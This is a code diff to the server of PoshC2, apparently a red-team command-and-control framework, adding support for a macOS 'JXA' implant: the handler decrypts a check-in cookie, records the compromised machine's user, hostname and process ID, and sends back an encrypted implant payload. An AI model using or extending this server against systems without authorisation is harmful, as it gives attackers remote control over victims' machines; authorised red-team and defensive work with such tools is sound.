@@ -14,7 +14,7 @@ from poshc2.server.payloads.Payloads import Payloads
 from poshc2.server.Config import PoshProjectDirectory, ServerHeader, PayloadsDirectory, GET_404_Response, DownloadsDirectory, Database, PayloadCommsHost, SocksHost
 from poshc2.server.Config import QuickCommand, KillDate, DefaultSleep, DomainFrontHeader, urlConfig, BindIP, BindPort
 from poshc2.server.Config import DownloadURI, URLS, SocksURLS, Insecure, UserAgent, Referrer, Pushover_APIToken
-from poshc2.server.Config import Pushover_APIUser, Slack_UserID, Slack_Channel, Slack_BotToken, EnableNotifications, DatabaseType 
+from poshc2.server.Config import Pushover_APIUser, Slack_UserID, Slack_Channel, Slack_BotToken, EnableNotifications, DatabaseType
 from poshc2.server.Cert import create_self_signed_cert
 from poshc2.client.Help import logopic
 from poshc2.Utils import validate_sleep_time, randomuri, gen_key
@@ -164,6 +164,8 @@ class MyHandler(BaseHTTPRequestHandler):
                     implant_type = "C# Daisy"
                 if self.path == ("%s?p?c" % new_implant_url):
                     implant_type = "C# Proxy"
+                if self.path == ("%s?j" % new_implant_url):
+                    implant_type = "JXA"
 
                 if implant_type.startswith("C#"):
                     cookieVal = (self.cookieHeader).replace("SessionID=", "")
@@ -189,6 +191,20 @@ class MyHandler(BaseHTTPRequestHandler):
                     newImplant.save()
                     newImplant.display()
                     response_content = encrypt(KEY, newImplant.PythonCore)
+
+                elif implant_type.startswith("JXA"):
+                    cookieVal = (self.cookieHeader).replace("SessionID=", "")
+                    decCookie = decrypt(KEY, cookieVal)
+                    IPAddress = "%s:%s" % (self.client_address[0], self.client_address[1])
+                    User, Hostname, PID, URLID = decCookie.split(";")
+                    Domain = Hostname
+                    URLID = URLID.replace("\x00", "")
+                    URLID = URLID.replace("\x07", "")
+                    newImplant = Implant(IPAddress, implant_type, str(Domain), str(User), str(Hostname), "x64", PID, URLID)
+                    newImplant.save()
+                    newImplant.display()
+                    response_content = encrypt(KEY, newImplant.JXACore)
+
                 else:
                     try:
                         cookieVal = (self.cookieHeader).replace("SessionID=", "")
